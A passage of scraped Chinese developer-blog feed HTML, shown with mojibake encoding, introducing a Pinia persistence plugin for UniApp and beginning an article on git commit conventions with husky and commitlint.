<li><strong>å¯åŠ¨ä½“éªŒå·®</strong>ï¼šå¦‚æœå¼‚æ­¥è¯»å–æ•°æ®ï¼ŒApp å¯åŠ¨æ—¶ç•Œé¢ä¼šå…ˆæ˜¾ç¤ºâ€œåˆå§‹å€¼â€ï¼ˆæ¯”å¦‚ç©ºç™½æˆ–æœªç™»å½•çŠ¶æ€ï¼‰ï¼Œè¿‡å‡ ç™¾æ¯«ç§’åæ‰é—ªå˜ä¸ºâ€œçœŸå®æ•°æ®â€ã€‚</li>
<li><strong>æ“ä½œå¡é¡¿</strong>ï¼šå¦‚æœåœ¨ä¸»çº¿ç¨‹åŒæ­¥å†™å…¥å¤§é‡æ•°æ®ï¼Œç”¨æˆ·æ»‘åŠ¨é¡µé¢æ—¶å¯èƒ½ä¼šæ„Ÿè§‰åˆ°æ‰å¸§ã€‚</li>
<li><strong>æ•°æ®ç±»å‹é™åˆ¶</strong>ï¼š<code>JSON.stringify</code> åŸç”Ÿä¸æ”¯æŒ <code>Date</code>ã€<code>BigInt</code> ç­‰ç±»å‹ï¼Œå­˜è¿›å»å–å‡ºæ¥è¿˜å¾—æ‰‹åŠ¨è½¬æ¢ã€‚</li>
</ul>
<p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘å¼€å‘äº†ä¸€ä¸ªè½»é‡çº§çš„æ’ä»¶ï¼š<code>pinia-plugin-uni-persist-next</code>ã€‚å®ƒä¸“æ³¨äºè§£å†³ UniApp ç¯å¢ƒä¸‹çš„ç‰¹æ®Šåœºæ™¯ï¼Œæä¾›æ›´æµç•…çš„å¼€å‘ä½“éªŒã€‚</p>
<hr/>
<h3 data-id="heading-1">ğŸŒŸ æ ¸å¿ƒç‰¹æ€§</h3>
<p>è¿™ä¸ªæ’ä»¶çš„è®¾è®¡æ€è·¯ä¸»è¦å›´ç»•ç€ <strong>â€œæ€§èƒ½â€</strong> å’Œ <strong>â€œæ˜“ç”¨æ€§â€</strong> å±•å¼€ï¼š</p>
<ol>
<li>
<p><strong>âš¡ è¯»å†™åˆ†ç¦»ç­–ç•¥</strong></p>
<ul>
<li><strong>åˆå§‹æ¢å¤ï¼ˆåŒæ­¥è¯»ï¼‰</strong>ï¼šæ’ä»¶ä½¿ç”¨ <code>uni.getStorageSync</code> åŒæ­¥è¯»å–æ•°æ®ã€‚è¿™ä¿è¯äº†åœ¨ç»„ä»¶æŒ‚è½½å‰ï¼ŒStore çš„çŠ¶æ€å·²ç»æ˜¯æœ€ç»ˆç»“æœï¼Œ<strong>é¿å…äº†ç•Œé¢é—ªçƒ</strong>ã€‚</li>
<li><strong>çŠ¶æ€ä¿å­˜ï¼ˆå¼‚æ­¥å†™ï¼‰</strong>ï¼šå½“çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ’ä»¶é»˜è®¤ä½¿ç”¨ <code>uni.setStorage</code> å¼‚æ­¥ä¿å­˜ï¼Œå¹¶åˆ©ç”¨ <code>post</code> æ¨¡å¼å»¶è¿Ÿæ‰§è¡Œï¼Œ<strong>é¿å…é¢‘ç¹ IO é˜»å¡ä¸»çº¿ç¨‹</strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong>ğŸ›¡ï¸ å¢å¼ºçš„åºåˆ—åŒ–æ”¯æŒ</strong></p>
<ul>
<li>å¼€å‘ä¸­éš¾å…ä¼šç”¨åˆ°ç‰¹æ®Šç±»å‹ã€‚æœ¬æ’ä»¶å†…ç½®äº†è‡ªå®šä¹‰åºåˆ—åŒ–æ–¹æ³•ï¼Œæ”¯æŒä»¥ä¸‹ç±»å‹çš„è‡ªåŠ¨è½¬æ¢ï¼š
<ul>
<li><strong>Date</strong>ï¼šè‡ªåŠ¨è¿˜åŸä¸ºæ—¥æœŸå¯¹è±¡ã€‚</li>
<li><strong>BigInt</strong>ï¼šè‡ªåŠ¨è½¬å­˜ï¼Œä¸æŠ¥é”™ã€‚</li>
<li><strong>å¾ªç¯å¼•ç”¨</strong>ï¼šèƒ½å®‰å…¨å¤„ç†å¯¹è±¡é—´çš„å¾ªç¯å¼•ç”¨ï¼Œé˜²æ­¢ç¨‹åºå´©æºƒã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>âš–ï¸ å­˜å‚¨ä½“ç§¯ç›‘æµ‹</strong></p>
<ul>
<li>è€ƒè™‘åˆ°å°ç¨‹åºå•æ¡ç¼“å­˜é€šå¸¸é™åˆ¶ä¸º 1MBï¼Œæ’ä»¶ä¼šåœ¨éç”Ÿäº§ç¯å¢ƒä¸‹ç›‘æµ‹å­˜å‚¨å¤§å°ã€‚å¦‚æœå•æ¡æ•°æ®è¶…è¿‡ <strong>3.5MB</strong>ï¼Œä¼šåœ¨æ§åˆ¶å°è¾“å‡ºè­¦å‘Šï¼Œå¸®åŠ©å¼€å‘è€…åŠæ—©å‘ç°éšæ‚£ã€‚</li>
</ul>
</li>
<li>
<p><strong>ğŸ§© çµæ´»é…ç½®</strong></p>
<ul>
<li>æ”¯æŒæŒ‰éœ€æŒä¹…åŒ–ï¼ˆ<code>paths</code> è¿‡æ»¤ï¼‰ã€‚</li>
<li>æ”¯æŒè‡ªå®šä¹‰å­˜å‚¨ Key å’Œå‰ç¼€ã€‚</li>
<li>æ”¯æŒ TypeScript ç±»å‹æç¤ºã€‚</li>
</ul>
</li>
</ol>
<hr/>
<hr/>
<h3 data-id="heading-2">ğŸ“¦ å®‰è£…</h3>
<p>æ¨èä½¿ç”¨ pnpmï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add pinia-plugin-uni-persist-next
</code></pre>
<p>æˆ–è€… yarn/npmï¼š</p>
<pre><code class="hljs language-bash" lang="bash">yarn add pinia-plugin-uni-persist-next
<span class="hljs-comment"># npm install pinia-plugin-uni-persist-next</span>
</code></pre>
<hr/>
<h3 data-id="heading-3">ğŸ› ï¸ å¿«é€Ÿä¸Šæ‰‹</h3>
<h4 data-id="heading-4">1. æ³¨å†Œæ’ä»¶</h4>
<p>åœ¨ä½ çš„ <code>main.ts</code> æˆ– <code>index.ts</code> ä¸­å¼•å…¥å¹¶å®‰è£…æ’ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createSSRApp } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;
<span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia"</span>;
<span class="hljs-keyword">import</span> { createUniPersistPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia-plugin-uni-persist-next"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./App.vue"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createApp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>);
  <span class="hljs-keyword">const</span> pinia = <span class="hljs-title function_">createPinia</span>();

  <span class="hljs-comment">// 1. åˆ›å»ºæ’ä»¶å®ä¾‹</span>
  <span class="hljs-keyword">const</span> uniPersist = <span class="hljs-title function_">createUniPersistPlugin</span>({
    <span class="hljs-attr">keyPrefix</span>: <span class="hljs-string">"my_app_"</span>, <span class="hljs-comment">// å¯é€‰ï¼šç»™æ‰€æœ‰ key åŠ ä¸Šç»Ÿä¸€å‰ç¼€</span>
  });

  <span class="hljs-comment">// 1. æ³¨å†Œåˆ° pinia</span>
  pinia.<span class="hljs-title function_">use</span>(uniPersist);

  app.<span class="hljs-title function_">use</span>(pinia);
  <span class="hljs-keyword">return</span> { app, <span class="hljs-title class_">Pinia</span>: pinia };
}
</code></pre>
<h4 data-id="heading-5">2. åœ¨ Store ä¸­å¼€å¯</h4>
<p>å°±åƒæŒ‰å¼€å…³ä¸€æ ·ç®€å•ï¼Œåœ¨ Store é‡ŒåŠ è¿™å‡ è¡Œä»£ç å°±è¡Œï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">"user"</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">token</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">userInfo</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">"æµ·ç»µå®å®"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">10</span> },
    <span class="hljs-attr">loginTime</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(), <span class="hljs-comment">// ç›´æ¥å­˜ Date ç±»å‹ï¼</span>
  }),
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-title function_">setToken</span>(<span class="hljs-params">token: <span class="hljs-built_in">string</span></span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = token;
    },
  },
  <span class="hljs-comment">// âœ¨ æ­¤å¤„å¼€å¯æŒä¹…åŒ–</span>
  <span class="hljs-attr">persist</span>: {
    <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  },
});
</code></pre>
<p>æå®šï¼ç°åœ¨å°±ç®—ä½ åˆ·æ–°é¡µé¢ï¼Œæˆ–è€…æ€æ‰ App é‡å¯ï¼Œ<code>token</code> ä¾ç„¶åœ¨ï¼Œè€Œä¸” <code>loginTime</code> å–å‡ºæ¥è¿˜æ˜¯ <code>Date</code> å¯¹è±¡ï¼Œä¸ç”¨ä½ è‡ªå·±è½¬ã€‚</p>
<hr/>
<h3 data-id="heading-6">âš™ï¸ è¿›é˜¶ç”¨æ³•ï¼ˆæ»¡è¶³ä½ çš„æ§åˆ¶æ¬²ï¼‰</h3>
<h4 data-id="heading-7">åœºæ™¯ä¸€ï¼šæ•°æ®å¤ªå¤šï¼Œæˆ‘åªæƒ³å­˜ä¸€éƒ¨åˆ†</h4>
<p>æ¯”å¦‚ <code>userInfo</code> å¾ˆé•¿ï¼Œæˆ‘åªæƒ³å­˜ä¸ª <code>token</code>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">persist</span>: {
  <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">strategies</span>: [
    {
      <span class="hljs-attr">paths</span>: [<span class="hljs-string">'token'</span>], <span class="hljs-comment">// æŒ‡å®šåå•ï¼šåªå­˜ token</span>
    },
  ],
}
</code></pre>
<h4 data-id="heading-8">åœºæ™¯äºŒï¼šæˆ‘æƒ³æ¢ä¸ªå­˜å‚¨ Key</h4>
<p>é»˜è®¤ Key æ˜¯ Store çš„ IDï¼ˆæ¯”å¦‚ä¸Šé¢çš„ <code>user</code>ï¼‰ï¼Œæ€•è·Ÿåˆ«äººçš„ key æ’è½¦ï¼Ÿæ”¹å®ƒï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-attr">persist</span>: {
  <span class="hljs-attr">enabled</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">strategies</span>: [
    {
      <span class="hljs-attr">key</span>: <span class="hljs-string">'my_auth_cache'</span>, <span class="hljs-comment">// æœ€ç»ˆåœ¨ Storage é‡Œå°±æ˜¯ "my_auth_cache"</span>
      <span class="hljs-attr">paths</span>: [<span class="hljs-string">'token'</span>],
    },
  ],
}
</code></pre>
<h3 data-id="heading-9">ğŸ” æŠ€æœ¯åŸç†ï¼ˆç»™å¥½å¥‡å®å®ï¼‰</h3>
<h4 data-id="heading-10">ä¸ºä»€ä¹ˆè¯´å®ƒâ€œè¯»å†™åˆ†ç¦»â€ä½“éªŒæœ€å¥½ï¼Ÿ</h4>
<p>æˆ‘ä»¬çœ‹ä¸ªä¼ªä»£ç å¯¹æ¯”ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ğŸ”µ å¯åŠ¨ APP æ—¶ï¼ˆè¯»ï¼‰ï¼šå¿…é¡»åŒæ­¥ï¼</span>
<span class="hljs-comment">// å¦‚æœè¿™é‡Œç”¨å¼‚æ­¥ï¼Œé¡µé¢å…ˆæ˜¾ç¤º"æœªç™»å½•"ï¼Œ0.1ç§’åå˜æˆ"å·²ç™»å½•"ï¼Œç”¨æˆ·ä¼šçœ‹åˆ°ç•Œé¢é—ªçƒã€‚</span>
<span class="hljs-comment">// æ‰€ä»¥æ’ä»¶å¼ºåˆ¶ä½¿ç”¨ getStorageSyncï¼Œä¿è¯é¡µé¢æ¸²æŸ“å‰æ•°æ®å°±åˆ°ä½äº†ã€‚</span>
<span class="hljs-keyword">const</span> data = uni.<span class="hljs-title function_">getStorageSync</span>(key);
store.$patch(data);

<span class="hljs-comment">// ğŸŸ  è¿è¡Œæ—¶ï¼ˆå†™ï¼‰ï¼šå¿…é¡»å¼‚æ­¥ï¼</span>
<span class="hljs-comment">// æ¯”å¦‚ç”¨æˆ·åœ¨æ»‘åŠ¨åˆ—è¡¨æ—¶è§¦å‘äº†çŠ¶æ€æ›´æ–°ï¼Œå¦‚æœè¿™æ—¶å€™åŒæ­¥å†™ç£ç›˜ï¼Œ</span>
<span class="hljs-comment">// JS çº¿ç¨‹å¡ä½ç­‰å¾… IOï¼Œç”¨æˆ·å°±ä¼šæ„Ÿè§‰æ»‘åŠ¨â€œæ‰å¸§â€å¡é¡¿ã€‚</span>
<span class="hljs-comment">// æ‰€ä»¥æ’ä»¶é»˜è®¤ä½¿ç”¨ setStorageï¼ˆå¼‚æ­¥ï¼‰ï¼Œå¹¶åœ¨åå°æ‚„æ‚„ä¿å­˜ã€‚</span>
store.$subscribe(<span class="hljs-function">() =&gt;</span> {
  uni.<span class="hljs-title function_">setStorage</span>({ key, data });
});
</code></pre>
<h4 data-id="heading-11">ä¸ºä»€ä¹ˆå®ƒæ¯” JSON.stringify æ›´å¼ºï¼Ÿ</h4>
<p>åŸç”Ÿçš„ <code>JSON.stringify</code> å¾ˆå‚»ï¼Œé‡åˆ° <code>Date</code> å˜æˆå­—ç¬¦ä¸²ï¼Œé‡åˆ° <code>BigInt</code> æŠ¥é”™ï¼Œé‡åˆ°å¾ªç¯å¼•ç”¨ç›´æ¥å´©ã€‚</p>
<p>æœ¬æ’ä»¶å†…éƒ¨å°è£…äº†ä¸€å¥— <code>safeStringify</code>ï¼š</p>
<ul>
<li>é‡åˆ° <strong>Date</strong> -&gt; æ ‡è®°ä¸ºæ—¥æœŸ -&gt; è¯»å–æ—¶è‡ªåŠ¨å˜å› Date</li>
<li>é‡åˆ° <strong>BigInt</strong> -&gt; è½¬å­—ç¬¦ä¸²å­˜ -&gt; ä¿è¯ä¸æŠ¥é”™</li>
<li>é‡åˆ° <strong>å¾ªç¯å¼•ç”¨</strong> -&gt; è‡ªåŠ¨åˆ‡æ–­ -&gt; ä¿è¯ä¸å´©æºƒ</li>
</ul>
<p>è¿™æ„å‘³ç€ï¼š<strong>ä½ å¯ä»¥æ”¾å¿ƒåœ°æŠŠä»»ä½•æ•°æ®å¾€ Pinia é‡Œä¸¢ï¼Œå‰©ä¸‹çš„äº¤ç»™æ’ä»¶ã€‚</strong></p>
<hr/>
<h3 data-id="heading-12">ğŸ“ æ€»ç»“</h3>
<p><code>pinia-plugin-uni-persist-next</code> å°±åƒæ˜¯ç»™ä½ çš„ UniApp åŠ ä¸Šäº†ä¸€ä¸ª<strong>ç¨³å›ºçš„åå‹¤è¡¥ç»™ç«™</strong>ã€‚</p>
<ul>
<li>å®ƒ<strong>å¾ˆè½»</strong>ï¼šä¸å ä»€ä¹ˆåŒ…ä½“ç§¯ã€‚</li>
<li>å®ƒ<strong>å¾ˆå¼º</strong>ï¼šDateã€BigIntã€å¾ªç¯å¼•ç”¨ç»Ÿç»Ÿæå®šã€‚</li>
<li>å®ƒ<strong>å¾ˆæ»‘</strong>ï¼šè¯»å†™åˆ†ç¦»è®¾è®¡ï¼Œç»ä¸æ‹–æ…¢ UI çº¿ç¨‹ã€‚</li>
</ul>
<p>å¦‚æœä½ è¿˜åœ¨ä¸º UniApp çš„æ•°æ®æŒä¹…åŒ–å¤´ç–¼ï¼Œæˆ–è€…å¿å—ç€æ—§æ–¹æ¡ˆçš„å¡é¡¿ï¼Œä¸å¦¨è¯•è¯•è¿™ä¸ªæ–°æ–¹æ¡ˆï¼</p>
<blockquote>
<p><strong>ğŸ”— GitHub åœ°å€</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHollelihanqi%2Fpinia-plugin-uni-persist-next" target="_blank" title="https://github.com/Hollelihanqi/pinia-plugin-uni-persist-next" ref="nofollow noopener noreferrer">github.com/Hollelihanqâ€¦</a><br/>
è§‰å¾—å¥½ç”¨çš„è¯ï¼Œæ±‚ä¸ª Star â­ï¸ï¼ä½ çš„æ”¯æŒæ˜¯æˆ‘æ›´æ–°çš„åŠ¨åŠ›ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æŠŠ Git æäº¤å˜æˆâ€œå¯æ‰§è¡Œè§„èŒƒâ€ï¼šCommit è§„èŒƒä½“ç³»ä¸ Husky/Commitlint/Commitizen/Lint-staged å…¨é“¾è·¯ä»‹ç»]]></title>    <link>https://juejin.cn/post/7592789801708273705</link>    <guid>https://juejin.cn/post/7592789801708273705</guid>    <pubDate>2026-01-08T07:41:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708273705" data-draft-id="7592540388298997823" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" æŠŠ Git æäº¤å˜æˆâ€œå¯æ‰§è¡Œè§„èŒƒâ€ï¼šCommit è§„èŒƒä½“ç³»ä¸ Husky/Commitlint/Commitizen/Lint-staged å…¨é“¾è·¯ä»‹ç»"/> <meta itemprop="keywords" content="å‰ç«¯,ä»£ç è§„èŒƒ"/> <meta itemprop="datePublished" content="2026-01-08T07:41:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="paradeå²æœˆ"/> <meta itemprop="url" content="https://juejin.cn/user/3773179639113831"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             æŠŠ Git æäº¤å˜æˆâ€œå¯æ‰§è¡Œè§„èŒƒâ€ï¼šCommit è§„èŒƒä½“ç³»ä¸ Husky/Commitlint/Commitizen/Lint-staged å…¨é“¾è·¯ä»‹ç»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3773179639113831/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    paradeå²æœˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:41:01.000Z" title="Thu Jan 08 2026 07:41:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬è§„èŒƒåŸºäº <code>Conventional Commits</code> æ€æƒ³ï¼Œé…åˆ <code>husky + commitlint + commitizen/cz-* + lint-staged</code> å·¥å…·é“¾ï¼Œåœ¨å›¢é˜Ÿå†…ç»Ÿä¸€æäº¤å†å²çš„å¯è¯»æ€§ä¸å¯ç»´æŠ¤æ€§ã€‚</p>
<ul>
<li>è§„èŒƒå®šä¹‰ï¼šæäº¤ä¿¡æ¯æ€ä¹ˆå†™ï¼ˆæ‰€æœ‰äººéƒ½éµå®ˆï¼‰</li>
<li>å·¥å…·ä¿éšœï¼šæœ¬åœ°æäº¤æ—¶è‡ªåŠ¨æ ¡éªŒï¼ˆå°½é‡å°‘é â€œè®°ä½è§„åˆ™â€ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-0">0. æ¦‚å¿µä¸å·¥å…·ç®€ä»‹</h2>
<p>è¿™ä¸€èŠ‚ç”¨äºå¿«é€Ÿç†è§£â€œä¸ºä»€ä¹ˆè¦åšè¿™äº›çº¦æŸâ€ä»¥åŠâ€œæ¯ä¸ªå·¥å…·å„è‡ªè´Ÿè´£ä»€ä¹ˆâ€ã€‚</p>
<h3 data-id="heading-1">0.1 Conventional Commitsï¼ˆæäº¤è§„èŒƒæ€æƒ³ï¼‰</h3>
<p><code>Conventional Commits</code> æ˜¯ä¸€å¥—çº¦å®šå¼çš„æäº¤ä¿¡æ¯æ ¼å¼ï¼Œç”¨ç»“æ„åŒ–çš„ <code>&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</code> æ¥è¡¨è¾¾å˜æ›´æ„å›¾ï¼Œå¸¦æ¥çš„æ”¶ç›ŠåŒ…æ‹¬ï¼š</p>
<ul>
<li>æäº¤å†å²æ›´å¯è¯»ï¼Œä»£ç å®¡æŸ¥æ›´é«˜æ•ˆ</li>
<li>ä¾¿äºæŒ‰ç±»å‹ç”Ÿæˆå˜æ›´æ—¥å¿—ï¼ˆChangelogï¼‰</li>
<li>ä¾¿äºè‡ªåŠ¨åŒ–æµç¨‹ï¼ˆå‘å¸ƒã€ç‰ˆæœ¬å·ã€å›æ»šå®šä½ï¼‰</li>
</ul>
<h3 data-id="heading-2">0.2 Git Hookï¼ˆGit é’©å­ï¼‰</h3>
<p>Git Hook æ˜¯ Git åœ¨å…³é”®åŠ¨ä½œå‘ç”Ÿæ—¶è§¦å‘è„šæœ¬çš„æœºåˆ¶ã€‚è¿™é‡Œé‡ç‚¹å…³æ³¨å®¢æˆ·ç«¯é’©å­ï¼š</p>
<ul>
<li><code>pre-commit</code>ï¼šåœ¨å†™å…¥ commit ä¹‹å‰æ‰§è¡Œï¼Œå¸¸ç”¨äºä»£ç æ£€æŸ¥/æ ¼å¼åŒ–/æµ‹è¯•</li>
<li><code>commit-msg</code>ï¼šåœ¨å†™å…¥ commit message ä¹‹åã€æœ€ç»ˆè½åº“ä¹‹å‰æ‰§è¡Œï¼Œå¸¸ç”¨äºæ ¡éªŒæäº¤ä¿¡æ¯æ ¼å¼</li>
</ul>
<h3 data-id="heading-3">0.3 Huskyï¼ˆHook ç®¡ç†ï¼‰</h3>
<p><code>husky</code> ç”¨æ¥æŠŠ hook ä»¥å¯ç»´æŠ¤çš„æ–¹å¼æ”¾è¿›ä»“åº“ï¼ˆé€šå¸¸åœ¨ <code>.husky/</code> ç›®å½•ï¼‰ï¼Œè®©å›¢é˜Ÿæˆå‘˜åœ¨æœ¬åœ° <code>git commit</code> æ—¶è‡ªåŠ¨è§¦å‘åŒä¸€å¥—è„šæœ¬ã€‚</p>
<h3 data-id="heading-4">0.4 Commitlintï¼ˆæäº¤ä¿¡æ¯æ ¡éªŒï¼‰</h3>
<p><code>commitlint</code> ç”¨æ¥æ ¡éªŒ commit message æ˜¯å¦æ»¡è¶³è§„åˆ™ï¼ˆä¾‹å¦‚ type æ˜¯å¦åœ¨å…è®¸åˆ—è¡¨ã€header é•¿åº¦é™åˆ¶ç­‰ï¼‰ã€‚å®ƒé€šå¸¸æŒ‚åœ¨ <code>commit-msg</code> hook ä¸Šï¼Œä¸é€šè¿‡å°±ä¸­æ­¢æäº¤ã€‚</p>
<h3 data-id="heading-5">0.5 Commitizen ä¸é€‚é…å™¨ï¼ˆäº¤äº’å¼ç”Ÿæˆï¼‰</h3>
<p><code>commitizen</code> æä¾›äº¤äº’å¼é—®ç­”æ¥ç”Ÿæˆ commit messageï¼Œé™ä½â€œé è®°å¿†æ‰‹å†™è§„èŒƒâ€çš„æˆæœ¬ã€‚</p>
<ul>
